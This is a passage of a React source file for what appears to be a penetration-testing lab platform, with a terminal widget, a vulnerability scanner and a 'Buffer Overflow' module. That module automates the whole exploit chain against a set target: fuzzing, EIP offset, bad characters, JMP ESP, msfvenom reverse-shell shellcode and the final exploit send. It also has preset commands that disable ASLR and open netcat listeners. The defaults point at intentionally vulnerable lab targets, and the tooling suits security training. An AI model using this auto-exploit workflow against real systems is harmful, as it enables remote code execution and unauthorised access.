                style={{background:`${C}11`,border:`1px solid ${C}33`,borderRadius:4,padding:"3px 8px",color:C,fontSize:10,fontFamily:"monospace",cursor:"pointer",maxWidth:160,overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}}
                title={cmd.cmd}>
                ▶ {cmd.label||cmd.cmd}
              </button>
              <button onClick={()=>navigator.clipboard.writeText(cmd.cmd)}
                style={{background:"#1e293b",border:"1px solid #334155",borderRadius:4,padding:"3px 6px",color:"#64748b",fontSize:10,cursor:"pointer"}}
                title="Copy">📋</button>
            </div>
          ))}
        </div>
      )}

      {/* Output */}
      <div ref={outRef} style={{flex:1,overflowY:"auto",padding:"8px 10px",fontFamily:"monospace",fontSize:11,color:"#94a3b8",whiteSpace:"pre-wrap",wordBreak:"break-all",lineHeight:1.5}}>
        {!sid && loading && <span style={{color:"#60a5fa"}}>Starting session...</span>}
        {output || (sid ? <span style={{color:"#475569"}}>$ _</span> : "")}
      </div>

      {/* Input */}
      <div style={{display:"flex",gap:0,borderTop:`1px solid #1e293b`,flexShrink:0}}>
        <span style={{color:C,padding:"6px 8px",fontFamily:"monospace",fontSize:12,background:"#0a0f1e",borderRadius:"0 0 0 10px"}}>$</span>
        <input value={input} onChange={e=>setInput(e.target.value)}
          onKeyDown={e=>{
            if(e.key==="Enter") sendCmd(input);
            if(e.key==="ArrowUp"){ const i=Math.min(hIdx+1,history.length-1); setHIdx(i); setInput(history[i]||""); }
            if(e.key==="ArrowDown"){ const i=Math.max(hIdx-1,-1); setHIdx(i); setInput(i===-1?"":history[i]||""); }
            if(e.key==="c"&&e.ctrlKey) sendCmd("\x03");
          }}
          placeholder="type command..."
          style={{flex:1,background:"#0a0f1e",border:"none",color:"#e2e8f0",fontFamily:"monospace",fontSize:11,padding:"6px 8px",outline:"none"}}/>
        <button onClick={()=>sendCmd(input)}
          style={{background:C+"22",border:"none",padding:"6px 10px",color:C,fontSize:11,cursor:"pointer",borderRadius:"0 0 10px 0",fontWeight:700}}>↵</button>
      </div>
    </div>
  );
}

function BufferOverflowModule({token}) {
  const apiUrl = getApiUrl();
  const [phase,      setPhase]      = useState(1);
  const [log,        setLog]        = useState([]);
  const [running,    setRunning]    = useState(false);
  const [eipInput,   setEipInput]   = useState("");
  const [waitEip,    setWaitEip]    = useState(false);
  const [waitJmp,    setWaitJmp]    = useState(false);
  const [jmpInput,   setJmpInput]   = useState("");
  const eipResolve   = useRef(null);
  const jmpResolve   = useRef(null);
  const stopRef      = useRef(false);
  const logRef       = useRef(null);
  const [targetIP,   setTargetIP]   = useState(()=>localStorage.getItem("bof_ip")||"192.168.56.102");
  const [targetPort, setTargetPort] = useState(()=>localStorage.getItem("bof_port")||"9999");
  const [prefix,     setPrefix]     = useState(()=>localStorage.getItem("bof_prefix")||"OVERFLOW1 ");
  const [lhost,      setLhost]      = useState(()=>localStorage.getItem("bof_lhost")||"192.168.56.102");
  const [lport,      setLport]      = useState(()=>localStorage.getItem("bof_lport")||"4444");
  const [binaryPath, setBinaryPath] = useState(()=>localStorage.getItem("bof_binary")||"/tmp/vulnserver");
  const [crashAt,    setCrashAt]    = useState("");
  const [offset,     setOffset]     = useState("");
  const [jmpEsp,     setJmpEsp]     = useState("");
  const [badChars,   setBadChars]   = useState("\\x00");
  const [shellcode,  setShellcode]  = useState("");
  const [pattern,    setPattern]    = useState("");
  const [done,       setDone]       = useState(new Set());

  useEffect(()=>{ localStorage.setItem("bof_ip",targetIP); },[targetIP]);
  useEffect(()=>{ localStorage.setItem("bof_port",targetPort); },[targetPort]);
  useEffect(()=>{ localStorage.setItem("bof_prefix",prefix); },[prefix]);
  useEffect(()=>{ localStorage.setItem("bof_lhost",lhost); },[lhost]);
  useEffect(()=>{ localStorage.setItem("bof_lport",lport); },[lport]);
  useEffect(()=>{ localStorage.setItem("bof_binary",binaryPath); },[binaryPath]);
  useEffect(()=>{ if(logRef.current) logRef.current.scrollTop=logRef.current.scrollHeight; },[log]);

  const add  = m => setLog(p=>[...p,m]);
  const mark = p => setDone(prev=>new Set([...prev,p]));

  const call = async (ep, body) => {
    const r = await fetch(`${apiUrl}${ep}`, {
      method:"POST",
      headers:{"Content-Type":"application/json","Authorization":`Bearer ${token || getAuthToken()}`},
      body: JSON.stringify(body)
    });
    return r.json();
  };

  const base = () => ({
    target:`${targetIP}:${targetPort}`,
    prefix, binary_path:binaryPath,
    lhost, lport:parseInt(lport)||4444,
    payload_type:"linux/x86/shell_reverse_tcp"
  });

  const reset = () => {
    stopRef.current = true;
    setRunning(false); setWaitEip(false); setPhase(1);
    setLog(["🔄 Reset — ready"]); setDone(new Set());
    setCrashAt(""); setOffset(""); setJmpEsp(""); setShellcode(""); setPattern("");
    if(eipResolve.current){ eipResolve.current(""); eipResolve.current=null; }
    if(jmpResolve.current){ jmpResolve.current(""); jmpResolve.current=null; }
    setWaitJmp(false); setJmpInput("");
  };

  const sendPattern = async () => {
    if(!pattern) return;
    add("📤 Sending pattern...");
    try {
      const r = await call("/api/bof/send_pattern", {...base(), pattern});
      add(r.sent ? "✅ Pattern sent — GEF shows $eip on crash" : `⚠ ${r.message}`);
    } catch(e){ add(`❌ ${e.message}`); }
  };

  const run = async () => {
    if(running) return;
    stopRef.current = false;
    setRunning(true); setLog([]); setDone(new Set());
    try {
      // Phase 1 — Fuzz
      setPhase(1); add("⏳ Phase 1: Fuzzing...");
      const r1 = await call("/api/bof/fuzz", {...base(), fuzz_step:100});
      if(r1.error) throw new Error(r1.error);
      setCrashAt(String(r1.crash_at)); mark(1);
      add(`✅ Phase 1: Crashed at ${r1.crash_at} bytes`);
      if(stopRef.current) throw new Error("Stopped");

      // Phase 2 — EIP Offset
      setPhase(2);
      const patSize = (r1.crash_at||500)+200;
      add("⏳ Phase 2: Generating cyclic pattern...");
      const r2 = await call("/api/bof/offset", {...base(), pattern_size:patSize});
      if(r2.pattern) setPattern(r2.pattern);
      add(`✅ Pattern ready (${patSize} bytes)`);
      add("");
      add("📋 GEF STEPS:");
      add("  1. Open terminal → gdb /tmp/vulnserver");
      add("  2. (gdb) handle SIGPIPE noprint nostop pass");
      add("  3. (gdb) run");
      add("  4. Click  📤 Send Pattern  button below");
      add("  5. GEF auto-shows: $eip : 0xXXXXXXXX");
      add("  6. Paste that value in the box below");
      add("");
      setWaitEip(true);
      const eipVal = await new Promise(res=>{ eipResolve.current=res; });
      setWaitEip(false);
      if(!eipVal||stopRef.current) throw new Error("Stopped");
      add(`⏳ Calculating offset for EIP = ${eipVal}...`);
      const r2b = await call("/api/bof/offset", {...base(), pattern_size:patSize, eip_value:eipVal});
      if(r2b.error) throw new Error(r2b.error);
      setOffset(String(r2b.offset)); mark(2);
      add(`✅ Phase 2: Offset = ${r2b.offset} bytes`);
      if(stopRef.current) throw new Error("Stopped");

      // Phase 3 — EIP Control
      setPhase(3); add("⏳ Phase 3: Confirming EIP control...");
      const r3 = await call("/api/bof/eip_control", {...base(), offset:parseInt(r2b.offset)});
      mark(3); add(`✅ Phase 3: ${r3.message||"EIP = 42424242 confirmed"}`);
      if(stopRef.current) throw new Error("Stopped");

      // Phase 4 — Bad Chars
      setPhase(4); add("⏳ Phase 4: Finding bad characters...");
      const r4 = await call("/api/bof/badchars", {...base(), offset:parseInt(r2b.offset)});
      setBadChars(r4.bad_chars||"\\x00"); mark(4);
      add(`✅ Phase 4: Bad chars = ${r4.bad_chars||"\\x00 only"}`);
      if(stopRef.current) throw new Error("Stopped");

      // Phase 5 — JMP ESP
      setPhase(5); add("⏳ Phase 5: Finding JMP ESP...");
      const r5 = await call("/api/bof/jmpesp", {...base(), offset:parseInt(r2b.offset), binary_path:binaryPath});
      let _jmpEsp = r5.address||"";
      if(_jmpEsp){ setJmpEsp(_jmpEsp); mark(5); add(`✅ Phase 5: JMP ESP = ${_jmpEsp}`); }
      else {
        add("⚠ Phase 5: JMP ESP not auto-found — enter manually");
        add("  In pwndbg terminal type:");
        add("  rop --grep \"jmp esp\"");
        add("  Copy the address (e.g. 0xf7e34d85) and paste below ↓");
        setWaitJmp(true);
        _jmpEsp = await new Promise(res=>{ jmpResolve.current=res; });
        setWaitJmp(false);
        if(!_jmpEsp||stopRef.current) throw new Error("Stopped");
        setJmpEsp(_jmpEsp); mark(5);
        add(`✅ Phase 5: JMP ESP = ${_jmpEsp} (manual)`);
      }
      if(stopRef.current) throw new Error("Stopped");

      // Phase 6 — Shellcode
      setPhase(6); add("⏳ Phase 6: Generating shellcode...");
      const r6 = await call("/api/bof/shellcode", {...base(), offset:parseInt(r2b.offset), jmp_esp:_jmpEsp});
      if(r6.error) throw new Error(r6.error);
      setShellcode(r6.shellcode_bytes||""); mark(6);
      add(`✅ Phase 6: Shellcode ready`);
      if(stopRef.current) throw new Error("Stopped");

      // Phase 7 — Exploit
      setPhase(7); add("⏳ Phase 7: Sending exploit...");
      add(`  Start listener: nc -lvnp ${lport}`);
      const r7 = await call("/api/bof/exploit", {...base(), offset:parseInt(r2b.offset), jmp_esp:_jmpEsp, shellcode:r6.shellcode_bytes});
      if(r7.error) throw new Error(r7.error);
      mark(7); add(`✅ Phase 7: ${r7.message||"Exploit sent!"}`);
      add("🎯 Check your netcat listener for shell!");

    } catch(e){
      add(stopRef.current ? "⏹ Stopped" : `❌ ${e.message}`);
    }
    stopRef.current = false; setRunning(false);
  };

  const PHASES = [
    {n:1,icon:"🔥",label:"Fuzzing",      desc:"Find crash point"},
    {n:2,icon:"📍",label:"EIP Offset",   desc:"Cyclic pattern → offset"},
    {n:3,icon:"🎯",label:"EIP Control",  desc:"Confirm BBBB = 0x42424242"},
    {n:4,icon:"🚫",label:"Bad Chars",    desc:"Bytes that break shellcode"},
    {n:5,icon:"🔀",label:"JMP ESP",      desc:"Find return address"},
    {n:6,icon:"💀",label:"Shellcode",    desc:"msfvenom payload"},
    {n:7,icon:"🎉",label:"Exploit",      desc:"Send final exploit"},
  ];

  const G = "#22c55e";

  const DEFAULT_TERMINALS = [
    {id:"setup",   title:"⚙ Setup",    color:"#f59e0b", presetCmds:[
      {label:"Disable ASLR",   cmd:"echo 0 | sudo tee /proc/sys/kernel/randomize_va_space"},
      {label:"Check vulnserver",cmd:"ls -la /tmp/vulnserver && echo 'Binary OK'"},
      {label:"Kill vulnserver", cmd:"pkill -f vulnserver; echo 'Killed'"},
    ]},
    {id:"gdb",     title:"🐛 GDB/pwndbg", color:"#22c55e", presetCmds:[
      {label:"Start GDB",       cmd:"gdb /tmp/vulnserver", pre:"quit"},
      {label:"Ignore SIGPIPE",  cmd:"handle SIGPIPE noprint nostop pass"},
      {label:"Run",             cmd:"run"},
      {label:"Find JMP ESP",    cmd:"rop --grep \"jmp esp\""},
      {label:"Show registers",  cmd:"info registers eip"},
      {label:"Quit GDB",        cmd:"quit"},
      {label:"Continue",        cmd:"continue"},
    ]},
    {id:"listener",title:"🎧 Listener",  color:"#a78bfa", presetCmds:[
      {label:"nc -lvnp 4444",   cmd:"nc -lvnp 4444"},
      {label:"nc -lvnp 9001",   cmd:"nc -lvnp 9001"},
      {label:"Show connections", cmd:"ss -tnp | grep 4444"},
    ]},
  ];
  const [terminals,    setTerminals]    = useState(DEFAULT_TERMINALS);
  const [showTerminals,setShowTerminals]= useState(true);

  const addTerminal = () => {
    const id = "t_"+Date.now();
    setTerminals(p=>[...p,{id,title:`Terminal ${p.length+1}`,color:"#60a5fa",presetCmds:[]}]);
  };
  const removeTerminal = id => setTerminals(p=>p.filter(t=>t.id!==id));

  return (
    <div style={{display:"flex",flexDirection:"column",height:"100%",background:"#020617",color:"#e2e8f0"}}>
      <div style={{display:"flex",flex:1,overflow:"hidden"}}>
      {/* Sidebar */}
      <div style={{width:210,background:"#0a0f1e",borderRight:"1px solid #1e293b",padding:14,flexShrink:0,overflowY:"auto"}}>
        <div style={{color:G,fontWeight:800,fontSize:13,marginBottom:14}}>💣 Buffer Overflow</div>
        {PHASES.map(p=>(
          <div key={p.n} onClick={()=>setPhase(p.n)} style={{padding:"9px 10px",borderRadius:7,marginBottom:5,cursor:"pointer",
            background:phase===p.n?"#052e1622":"transparent",border:`1px solid ${phase===p.n?G:"#1e293b"}`}}>
            <div style={{display:"flex",alignItems:"center",gap:8}}>
              <span>{p.icon}</span>
              <div>
                <div style={{fontSize:11,fontWeight:700,color:done.has(p.n)?G:phase===p.n?"#e2e8f0":"#64748b"}}>
                  {done.has(p.n)?"✅ ":""}{p.n}. {p.label}
                </div>
                <div style={{fontSize:9,color:"#475569"}}>{p.desc}</div>
              </div>
            </div>
          </div>
        ))}
        <div style={{marginTop:14,borderTop:"1px solid #1e293b",paddingTop:12}}>
          <div style={{fontSize:10,color:"#475569",marginBottom:6}}>RESULTS</div>
          {[["Crash",crashAt?crashAt+" bytes":"—"],["Offset",offset||"—"],["JMP ESP",jmpEsp||"—"],["Bad Chars",badChars]].map(([k,v])=>(
            <div key={k} style={{display:"flex",justifyContent:"space-between",fontSize:10,marginBottom:4}}>
              <span style={{color:"#64748b"}}>{k}</span>
              <span style={{color:G,fontFamily:"monospace",fontSize:9}}>{v}</span>
            </div>
          ))}
        </div>
      </div>

      {/* Main area */}
      <div style={{flex:1,display:"flex",flexDirection:"column",overflow:"hidden"}}>
        {/* Header / Inputs */}
        <div style={{padding:"12px 16px",borderBottom:"1px solid #1e293b",flexShrink:0}}>
          <div style={{display:"flex",gap:8,flexWrap:"wrap",marginBottom:10}}>
            {[["Target IP","192.168.56.102",targetIP,setTargetIP,90],["Port","9999",targetPort,setTargetPort,60],
              ["Prefix","OVERFLOW1 ",prefix,setPrefix,110],["Binary","/tmp/vulnserver",binaryPath,setBinaryPath,130],
              ["LHOST","192.168.56.102",lhost,setLhost,110],["LPORT","4444",lport,setLport,55]].map(([lbl,ph,val,set,w])=>(
              <div key={lbl}>
                <div style={{fontSize:9,color:"#475569",marginBottom:2}}>{lbl}</div>
                <input value={val} onChange={e=>set(e.target.value)} placeholder={ph}
                  style={{background:"#0f172a",border:"1px solid #334155",borderRadius:5,padding:"5px 7px",color:"#e2e8f0",fontSize:11,outline:"none",width:w}}/>
              </div>
            ))}
          </div>
          <div style={{display:"flex",gap:8}}>
            <button onClick={reset} style={{background:"#1e293b",border:"1px solid #334155",borderRadius:6,padding:"7px 14px",color:"#ef4444",fontSize:11,fontWeight:700,cursor:"pointer"}}>🗑 Reset</button>
            {running
              ? <button onClick={()=>stopRef.current=true} style={{background:"#450a0a",border:"1px solid #ef4444",borderRadius:6,padding:"7px 16px",color:"#fca5a5",fontSize:11,fontWeight:800,cursor:"pointer"}}>⏹ Stop</button>
              : <button onClick={run} style={{background:"linear-gradient(135deg,#16a34a,#15803d)",border:"none",borderRadius:6,padding:"7px 20px",color:"#fff",fontSize:12,fontWeight:800,cursor:"pointer",boxShadow:"0 0 12px #16a34a55"}}>⚡ Auto-Exploit</button>
            }
          </div>
        </div>

        {/* GEF banner */}
        <div style={{margin:"10px 16px 0",background:"#0a1f0a",border:"1px solid #166534",borderRadius:7,padding:"8px 12px",fontSize:11,color:"#86efac",flexShrink:0}}>
          <b style={{color:"#4ade80"}}>🐛 GEF Ready</b>{"  "}
          <code style={{background:"#052e16",padding:"1px 6px",borderRadius:3}}>gdb /tmp/vulnserver</code>{" → "}
          <code style={{background:"#052e16",padding:"1px 6px",borderRadius:3}}>handle SIGPIPE noprint nostop pass</code>{" → "}
          <code style={{background:"#052e16",padding:"1px 6px",borderRadius:3}}>run</code>
          {"  — GEF auto-shows $eip on crash. No manual commands needed."}
        </div>

        {/* Log */}
        <div ref={logRef} style={{flex:1,overflowY:"auto",padding:"12px 16px",fontFamily:"monospace",fontSize:12}}>
          {log.length===0 && (
            <div style={{textAlign:"center",paddingTop:50,color:"#334155"}}>
              <div style={{fontSize:48,marginBottom:12}}>💣</div>
              <div style={{fontSize:15,fontWeight:700,color:"#475569"}}>Buffer Overflow — GEF Edition</div>
              <div style={{fontSize:12,marginTop:8}}>Set target IP → click ⚡ Auto-Exploit</div>
            </div>
          )}
          {log.map((l,i)=>(
            <div key={i} style={{marginBottom:3,lineHeight:1.6,
              color:l.startsWith("✅")?"#22c55e":l.startsWith("❌")?"#ef4444":l.startsWith("⏹")?"#f59e0b":
                    l.startsWith("📋")||l.startsWith("  ")?"#60a5fa":l.startsWith("🎯")?"#a78bfa":"#94a3b8"}}>
              {l}
            </div>
          ))}
          {running&&!waitEip&&!waitJmp&&<div style={{color:"#60a5fa"}}>▌</div>}

          {/* JMP ESP Manual Input Box */}
          {waitJmp && (
            <div style={{marginTop:12,padding:16,background:"#1a0a00",border:"2px solid #f59e0b",borderRadius:10}}>
              <div style={{color:"#fbbf24",fontWeight:800,fontSize:13,marginBottom:8}}>🔀 Phase 5: Enter JMP ESP manually</div>
              <div style={{fontSize:11,color:"#fde68a",marginBottom:12,lineHeight:1.9}}>
                In your GDB/pwndbg terminal type:<br/>
                <code style={{background:"#1a0a00",border:"1px solid #78350f",padding:"3px 10px",borderRadius:4,color:"#fbbf24",display:"inline-block",margin:"4px 0"}}>rop --grep "jmp esp"</code><br/>
                You'll see addresses like <code style={{color:"#fbbf24"}}>0xf7e34d85</code> — paste one below.
              </div>
              <div style={{display:"flex",gap:8,alignItems:"center"}}>
                <input value={jmpInput} onChange={e=>setJmpInput(e.target.value)}
                  placeholder="e.g. 0xf7e34d85" autoFocus
                  onKeyDown={e=>{ if(e.key==="Enter"&&jmpInput.trim()){ jmpResolve.current(jmpInput.trim()); setJmpInput(""); }}}
                  style={{flex:1,background:"#020617",border:"2px solid #f59e0b",borderRadius:6,padding:"10px 14px",color:"#fbbf24",fontSize:15,fontFamily:"monospace",outline:"none"}}/>
                <button disabled={!jmpInput.trim()}
                  onClick={()=>{ if(jmpInput.trim()){ jmpResolve.current(jmpInput.trim()); setJmpInput(""); }}}
                  style={{background:jmpInput.trim()?"#b45309":"#374151",border:"none",borderRadius:6,padding:"10px 20px",color:"#fff",fontSize:13,fontWeight:800,cursor:jmpInput.trim()?"pointer":"not-allowed"}}>
                  Submit →
                </button>
              </div>
            </div>
          )}

          {/* EIP Wait Box */}
          {waitEip && (
            <div style={{marginTop:12,padding:16,background:"#0a1f0a",border:"2px solid #22c55e",borderRadius:10}}>
              <div style={{color:"#4ade80",fontWeight:800,fontSize:13,marginBottom:8}}>🐛 GEF showing crash output</div>
              <div style={{fontSize:11,color:"#86efac",marginBottom:12,lineHeight:1.9}}>
                In your GDB terminal GEF shows:<br/>
                <code style={{background:"#052e16",padding:"3px 10px",borderRadius:4,color:"#4ade80",display:"inline-block",margin:"4px 0"}}>$eip : 0x61413761  ("a7Aa")</code><br/>
                Copy those 8 hex digits → paste below. Also click 📤 to send the pattern if not done.
              </div>
              <div style={{marginBottom:10}}>
                <button onClick={sendPattern} disabled={!pattern}
                  style={{background:"#1e3a8a",border:"1px solid #3b82f6",borderRadius:6,padding:"7px 16px",color:"#93c5fd",fontSize:11,fontWeight:700,cursor:pattern?"pointer":"not-allowed"}}>
                  📤 Send Pattern to Vulnserver
                </button>
                <span style={{color:"#475569",fontSize:10,marginLeft:8}}>Click after GDB shows "Listening on port 9999"</span>
              </div>
              <div style={{display:"flex",gap:8,alignItems:"center"}}>
                <input value={eipInput} onChange={e=>setEipInput(e.target.value)}
                  placeholder="e.g. 61413761" autoFocus
                  onKeyDown={e=>{ if(e.key==="Enter"&&eipInput.trim()){ eipResolve.current(eipInput.trim()); setEipInput(""); }}}
                  style={{flex:1,background:"#020617",border:"2px solid #22c55e",borderRadius:6,padding:"10px 14px",color:"#4ade80",fontSize:16,fontFamily:"monospace",outline:"none",letterSpacing:3}}/>
                <button disabled={!eipInput.trim()}
                  onClick={()=>{ if(eipInput.trim()){ eipResolve.current(eipInput.trim()); setEipInput(""); }}}
                  style={{background:eipInput.trim()?"#16a34a":"#374151",border:"none",borderRadius:6,padding:"10px 24px",color:"#fff",fontSize:13,fontWeight:800,cursor:eipInput.trim()?"pointer":"not-allowed"}}>
                  Submit →
                </button>
              </div>
            </div>
          )}
        </div>
      </div>
      </div>

    {/* ── TERMINAL PANEL ── */}
    <div style={{borderTop:"2px solid #1e293b",background:"#050b18",flexShrink:0}}>
      {/* Terminal bar header */}
      <div style={{display:"flex",alignItems:"center",gap:8,padding:"6px 14px",borderBottom:"1px solid #1e293b"}}>
        <span style={{color:"#60a5fa",fontWeight:700,fontSize:12}}>⬛ TERMINALS</span>
        <span style={{color:"#334155",fontSize:11}}>{terminals.length} open</span>
        <div style={{flex:1}}/>
        <button onClick={addTerminal}
          style={{background:"#1e3a8a",border:"1px solid #3b82f6",borderRadius:5,padding:"3px 12px",color:"#93c5fd",fontSize:12,fontWeight:800,cursor:"pointer"}}>
          + New Terminal
        </button>
        <button onClick={()=>setShowTerminals(p=>!p)}
          style={{background:"#1e293b",border:"1px solid #334155",borderRadius:5,padding:"3px 10px",color:"#64748b",fontSize:11,cursor:"pointer"}}>
          {showTerminals?"▼ Hide":"▲ Show"}
        </button>
      </div>

      {showTerminals && (
        <div style={{display:"grid",gridTemplateColumns:`repeat(${Math.min(terminals.length,3)},1fr)`,gap:6,padding:8,height:280}}>
          {terminals.map(t=>(
            <TerminalWidget key={t.id} apiUrl={apiUrl} title={t.title} color={t.color}
              presetCmds={t.presetCmds} onClose={terminals.length>1?()=>removeTerminal(t.id):null}/>
          ))}
        </div>
      )}
    </div>
    </div>
  );
}

function VulnModule(props) {
  const token = props.token;
  const _notifyRunning = props.onRunningChange || (() => {});
  const [target,setTarget]     = useState("");
  const [running,setRunning]   = useState(false);
  const [current,setCurrent]   = useState(-1);
  const [done,setDone]         = useState([]);
  const [allResults,setAllResults] = useState({});
  const [lines,setLines]       = useState(["Ready — enter target and click Run All Scans"]);
  const [finished,setFinished] = useState(false);
  const [activeTab,setActiveTab] = useState(null);
  // ── Authenticated-scan state ──
  // When the user fills in login URL + creds, we hit /api/scan/login first,
  // capture the session cookie, and inject it into every downstream scanner.
  // Empty fields = unauthenticated scan (existing behaviour).
  const [authOpen,setAuthOpen]       = useState(false);
  const [loginUrl,setLoginUrl]       = useState("");
  const [loginUser,setLoginUser]     = useState("");
  const [loginPass,setLoginPass]     = useState("");
  const [loginUserField,setLoginUserField] = useState("");
  const [loginPassField,setLoginPassField] = useState("");
  const [loginSuccessUrl,setLoginSuccessUrl] = useState("");
  const [authCookie,setAuthCookie]   = useState("");
  const [authBearer,setAuthBearer]   = useState("");
  const [authType,setAuthType]       = useState("form");
  const [authStatus,setAuthStatus]   = useState(null); // null | "ok" | "fail"
  const [authorized,setAuthorized]   = useState(false);
  const add = l => setLines(p=>[...p,l]);

  const runAll = async () => {
    if(!target.trim()) return;
    setRunning(true); _notifyRunning(true); setFinished(false); setDone([]); setAllResults({}); setCurrent(-1);
    setLines([`[*] Starting full vulnerability scan on ${target} — ${VULN_PHASES.length} scanners, all enabled`]);

    // ── Step 0: authenticate to the target if the user gave us creds ──
    // Captures a session cookie (or bearer token) and reuses it across every
    // downstream scanner. Failure here is non-fatal: we continue with an
    // unauthenticated scan but log the reason so the user knows why
    // post-login surface wasn't covered.
    let sessionCookie = authCookie;
    let sessionBearer = authBearer;
    const wantsAuth = (authType==="form"   && loginUrl.trim() && loginUser.trim() && loginPass.trim()) ||
                      (authType==="basic"  && loginUser.trim() && loginPass.trim()) ||
                      (authType==="bearer" && authBearer.trim());
    if(wantsAuth && !sessionCookie && !sessionBearer){
      add(`[*] Step 0: authenticating to target (${authType}) ...`);
      try {
        const loginBody = {
          target, login_url: loginUrl, username: loginUser, password: loginPass,
          username_field: loginUserField || undefined,
          password_field: loginPassField || undefined,
          success_indicator: loginSuccessUrl || undefined,
          auth_type: authType,
          bearer_token: authType==="bearer" ? authBearer : undefined,
        };
        const lr = await api("/api/scan/login","POST",loginBody,token);
        if(lr && lr.login_verified){
          sessionCookie = lr.auth_cookie || "";
          sessionBearer = lr.auth_bearer || "";
          setAuthCookie(sessionCookie); setAuthBearer(sessionBearer);
          setAuthStatus("ok");
          add(`[✓] Logged in as ${loginUser} — session captured (${(lr.cookie_names||[]).join(", ")||"bearer"})`);
        } else {
          setAuthStatus("fail");
          add(`[!] Login could not be verified — ${lr?.hint || "continuing unauthenticated"}`);
        }
      } catch(e){
        setAuthStatus("fail");
        add(`[!] Login call failed — continuing unauthenticated: ${e.message||e}`);
      }
    }

    const results = {};
    // Single-retry-on-failure (same pattern as Recon module). Transient
    // 429s / network glitches no longer permanently drop a phase.
    const _scanBody = () => {
      const b = {target, scan_type:"full"};
      if(sessionCookie) b.auth_cookie = sessionCookie;
      if(sessionBearer) b.auth_bearer = sessionBearer;
      return b;
    };
    const _callWithRetry = async (ph) => {
      try {
        return await api(ph.endpoint,"POST",_scanBody(),token);
      } catch(e1) {
        add(`  ↻ ${ph.name} failed once — retrying in 3s...`);
        await new Promise(r=>setTimeout(r,3000));
        return await api(ph.endpoint,"POST",_scanBody(),token);
      }
    };
    for(let i=0;i<VULN_PHASES.length;i++){
      const ph = VULN_PHASES[i];
      setCurrent(i);
      add(`[*] Phase ${i+1}/${VULN_PHASES.length}: ${ph.name}...`);
      try {
        const data = await _callWithRetry(ph);
        results[ph.tool] = data;
        setAllResults({...results});
        const findings=(data.findings||[]).filter(f=>f.severity!=="INFO");
        const hi=findings.filter(f=>["CRITICAL","HIGH"].includes(f.severity)).length;
        add(`[✓] ${ph.name}: ${findings.length} finding(s)${hi>0?" — "+hi+" HIGH/CRITICAL":""}`);
      } catch(e){
        // CRITICAL: save the error so the PDF Scan Coverage table can
        // render FAILED with reason — NOT a silent "not run" omission.
        // (User directive: "no silent skipping. everything has to be in
        // the report under the tool.")
        const msg = e.message || "unknown error";
        results[ph.tool] = {ok:false, _failed:true, error:msg};
        setAllResults({...results});
        add(`[✗] ${ph.name}: ${msg}`);
      }
      setDone(p=>[...p,i]);
    }
    const okCount     = Object.values(results).filter(x=>x && !x._failed).length;
    const failedCount = Object.values(results).filter(x=>x && x._failed).length;
    setCurrent(-1); setRunning(false); _notifyRunning(false); setFinished(true);
    setActiveTab(VULN_PHASES[0].tool);
    add(`[✓] Vulnerability scan complete — ${okCount} ok, ${failedCount} failed (${VULN_PHASES.length} attempted)`);
  };

  const sevColor = s => ({CRITICAL:"#dc2626",HIGH:"#ea580c",MEDIUM:"#ca8a04",LOW:"#16a34a",INFO:"#64748b"}[s]||"#64748b");

  const renderFindings = (tool) => {
    const r = allResults[tool];
    if(!r) return <div style={{padding:16,color:"#64748b",fontSize:12}}>No data — scan may have failed.</div>;
    const findings = (r.findings||[]).filter(f=>f.severity!=="INFO");
    if(findings.length===0) return (
      <div style={{padding:20,textAlign:"center"}}>
        <div style={{fontSize:28,marginBottom:8}}>✅</div>
        <div style={{color:"#4ade80",fontSize:13,fontWeight:600}}>No significant findings</div>
        <div style={{color:"#475569",fontSize:11,marginTop:4}}>Scan completed — target appears clean for this check</div>
      </div>
    );
    return findings.map((f,i)=>{
      const c=sevColor(f.severity);
      return(
        <div key={i} style={{padding:"12px 16px",borderBottom:"1px solid #0f172a",borderLeft:`3px solid ${c}`}}>
          <div style={{display:"flex",gap:8,marginBottom:6,flexWrap:"wrap",alignItems:"center"}}>
            <span style={{background:c+"20",color:c,fontSize:9,fontWeight:700,padding:"2px 8px",borderRadius:3}}>{f.severity}</span>
            {f.cwe&&<span style={{background:"#7c3aed20",color:"#a78bfa",fontSize:9,fontWeight:700,padding:"2px 8px",borderRadius:3}}>{f.cwe}</span>}
            {f.cvss&&<span style={{fontSize:9,color:"#64748b"}}>CVSS: {f.cvss}</span>}
          </div>
          <div style={{fontSize:12,color:"#e2e8f0",marginBottom:4}}>{f.detail}</div>
          {f.remediation&&<div style={{fontSize:11,color:"#4ade80",background:"#052e16",padding:"4px 8px",borderRadius:3}}>Fix: {f.remediation}</div>}
        </div>
      );
    });
  };

  const totalFindings = Object.values(allResults).flatMap(r=>(r?.findings||[]).filter(f=>f.severity!=="INFO")).length;
  const highCrit = Object.values(allResults).flatMap(r=>(r?.findings||[]).filter(f=>["CRITICAL","HIGH"].includes(f.severity))).length;

  return (
    <div className="fade">
      {/* Header */}
      <div style={{background:"#0f172a",border:"1px solid #1e293b",borderRadius:8,padding:20,marginBottom:16}}>
        <div style={{display:"flex",justifyContent:"space-between",alignItems:"flex-start",marginBottom:12}}>
          <div>
            <h2 style={{fontSize:15,fontWeight:700,color:"#f1f5f9",margin:0}}>🛡️ Vulnerability Scanning</h2>
            <p style={{fontSize:11,color:"#475569",margin:"4px 0 0"}}>Full automated vulnerability assessment — {VULN_PHASES.length} scanners</p>
          </div>
          <span style={{background:"#1e3a8a",color:"#93c5fd",fontSize:10,fontWeight:700,padding:"4px 10px",borderRadius:4}}>{VULN_PHASES.length} SCANS</span>
        </div>
        <TestTargets onSelect={setTarget} targets={[
          {icon:"🏠",label:"DVWA",             value:"http://lab_dvwa/dvwa",           desc:"Damn Vulnerable Web App — SQLi, XSS, CSRF, File Upload (Docker)"},
          {icon:"🐐",label:"WebGoat",          value:"http://lab_webgoat:8080/WebGoat",   desc:"OWASP WebGoat — Java/Tomcat guided lessons (Docker)"},
          {icon:"🧃",label:"Juice Shop",       value:"http://lab_juiceshop:3000",           desc:"OWASP Juice Shop — 100+ challenges (Docker)"},
          {icon:"🐙",label:"Mutillidae II",    value:"http://lab_mutillidae",             desc:"Mutillidae — SQLi, XXE, CSRF, Clickjacking (Docker)"},
          {icon:"🌐",label:"Acunetix TestPHP", value:"http://testphp.vulnweb.com",        desc:"Public intentionally vulnerable PHP site (Internet)"},
        ]}/>
        {/* ── Authenticated-scan panel (collapsible) ──
            When filled, the scanner logs in BEFORE the scan phases and
            attaches the captured session to every scanner request.
            Without this, ~70% of real vulns (IDOR, priv-esc, mass
            assignment, stored XSS in profiles, etc.) stay invisible. */}
